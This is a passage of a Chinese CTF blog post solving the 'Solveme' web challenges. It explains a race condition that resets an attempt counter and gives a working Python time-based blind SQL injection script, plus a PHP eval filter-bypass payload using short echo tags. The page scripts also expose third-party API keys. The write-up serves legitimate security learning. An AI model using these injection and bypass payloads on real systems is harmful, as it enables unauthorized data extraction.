class="string">'_'</span>.mt_rand()));</span><br><span class="line">        mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">        <span class="keyword">goto</span> quit;</span><br><span class="line">    &#125;</span><br><span class="line">    $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">    $result = mysqli_fetch_array(</span><br><span class="line">        mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>代码大概流程大概count=12或者table不存在的时候就建立新表重置count次数，然后知道answer相同时才会输出flag，限定了每轮只能尝试12次，之后answer就会变化且重置次数，但是题目存在逻辑漏洞，题目关键顺序是：</p>
+<blockquote>
+<p>判断count的值–&gt;执行SQL语句–&gt;加count值</p>
+</blockquote>
+<p>按照这个逻辑顺序，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 <code>执行SQL语句</code> 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>:<span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line"><span class="string">"Cache-Control"</span>:<span class="string">"max-age=0"</span>,</span><br><span class="line"><span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36"</span>,</span><br><span class="line"><span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Referer"</span>:<span class="string">"http://solveme.peng.kr/chall"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>:<span class="string">"__test=8f5247d83ccd8573674837d6f9a37fd1"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">'440763269e2fe7a672a52ea827728'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(50),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">30</span>).content</span><br><span class="line">            print(content[:<span class="number">10</span>])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>这题目盲注时间有点长，这里贴一下结果 <code>440763269e2fe7a672a52ea827728539</code> 。</p>
+<h1 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h1><p>主要代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目过滤了括号，也基本过滤完了能用的函数，所以思路就是在 <code>eval($_GET[&#39;flag&#39;])</code> 中让其直接输出flag，虽然题目过滤了flag，但是PHP文档中有如下内容 <a href="http://php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">Click Here</a> ，也就是说可以用 <code>&lt;?= expression?&gt;</code> 来达到绕过 <code>echo</code> 过滤的目的。</p>
+<p>我们可以构造 <code>&lt;?= flag?&gt;</code> 来输出flag，尝试构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'alag'</span>;$a&#123;<span class="number">0</span>&#125;=<span class="string">'f'</span>;<span class="meta">?&gt;</span><span class="number">11111111111111111</span>;<span class="meta">&lt;?</span>=$$a;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+  <div>
+    
+      <div>
+    
+        <div style="text-align:center;color: #4b4b4b;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您今天怎么辣么迷人！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/reward-wechat.png" alt="新城瑞雪 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/reward-alipay.jpg" alt="新城瑞雪 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>新城瑞雪</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://chaosec.top/2018/07/31/solveme/" title="Solveme题解">http://chaosec.top/2018/07/31/solveme/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/24/Train-my-pet/" rel="next" title="萌宠养成记">
+                <i class="fa fa-chevron-left"></i> 萌宠养成记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/31/rootme/" rel="prev" title="rootme.webserver1">
+                rootme.webserver1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">新城瑞雪</p>
+              <p class="site-description motion-element" itemprop="description">相逢意气为君饮</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">30</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index-2.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/PPointCharles" title="GitHub &rarr; https://github.com/PPointCharles" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="mailto:1426594174@qq.com" title="E-Mail &rarr; mailto:1426594174@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"/></a>
+             </div>
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Warm-up"><span class="nav-number">2.</span> <span class="nav-text"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bad-compare"><span class="nav-number">3.</span> <span class="nav-text"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Winter-sleep"><span class="nav-number">4.</span> <span class="nav-text"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hard-login"><span class="nav-number">5.</span> <span class="nav-text"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URL-filtering"><span class="nav-number">6.</span> <span class="nav-text"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hash-collision"><span class="nav-number">7.</span> <span class="nav-text"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Array2String"><span class="nav-number">8.</span> <span class="nav-text"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Flag-not-found"><span class="nav-number">9.</span> <span class="nav-text"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Give-me-a-link-2"><span class="nav-number">10.</span> <span class="nav-text"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Give-me-a-link"><span class="nav-number">11.</span> <span class="nav-text"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Replace-filter"><span class="nav-number">12.</span> <span class="nav-text"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hell-JS"><span class="nav-number">13.</span> <span class="nav-text"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Anti-SQLi"><span class="nav-number">14.</span> <span class="nav-text"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Name-Check"><span class="nav-number">15.</span> <span class="nav-text"><a href="#Name-Check" class="headerlink" title="Name Check"></a>Name Check</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#I-am-slowly"><span class="nav-number">16.</span> <span class="nav-text"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Check-via-eval"><span class="nav-number">17.</span> <span class="nav-text"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">新城瑞雪</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/three/three.min.js"></script>
+
+  
+  <script src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $('.leancloud_visitors');
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
+            
+              .done(function() {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.time + 1);
+              })
+            
+              .fail(function ({ responseJSON }) {
+                console.log(`Failed to save Visitor num, with error message: ${responseJSON.error}`);
+              })
+          } else {
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text('Counter not initialized! More info at console err msg.');
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .fail(function ({ responseJSON }) {
+          console.log(`LeanCloud Counter Error: ${responseJSON.code} ${responseJSON.error}`);
+        });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'vSSOfqeDl62sLdrNdF2Kqigh-gzGzoHsz')
+        .done(function({ api_server }) {
+          var Counter = function(method, url, data) {
+            return $.ajax({
+              method: method,
+              url: 'https://' + api_server + '/1.1' + url,
+              headers: {
+                'X-LC-Id': 'vSSOfqeDl62sLdrNdF2Kqigh-gzGzoHsz',
+                'X-LC-Key': 'FKDjLVri4dF3W2GHPq9mP2WR',
+                'Content-Type': 'application/json',
+              },
+              data: data
+            });
+          };
+          
+            addCount(Counter);
+          
+        });
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
